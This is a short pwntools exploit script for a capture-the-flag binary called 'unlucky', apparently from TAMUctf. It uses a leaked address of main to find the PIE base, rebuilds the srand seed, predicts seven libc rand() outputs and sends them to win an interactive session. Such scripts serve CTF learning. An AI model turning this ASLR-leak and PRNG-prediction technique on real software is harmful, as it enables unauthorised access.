#!/usr/bin/python3
from pwn import *
import ctypes

BINARY = './unlucky'

elf = context.binary = ELF(BINARY, checksec=False)

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    if args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="unlucky")
    else:
        return process(elf.path)

p = start()

p.recvuntil(b"Here's a lucky number: ")
leak = int(p.recvline(), 16)
elf.address = leak - elf.sym.main
info(f"Pie base @ {hex(elf.address)}")
info(f"Main @ {hex(leak)}")
# Influenced seed by pie
seed = (0x4068 + elf.address) & 0xffffffff
libc_func = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
libc_func.srand(seed)

# append the produce values to the array
array = []
for i in range(7):
    array.append(libc_func.rand())
# send the values
for i in range(7):
    p.sendlineafter(f"Enter lucky number #{i+1}:\n".encode(), str(f"{array[i]}").encode())

p.interactive()
#pwn3d!
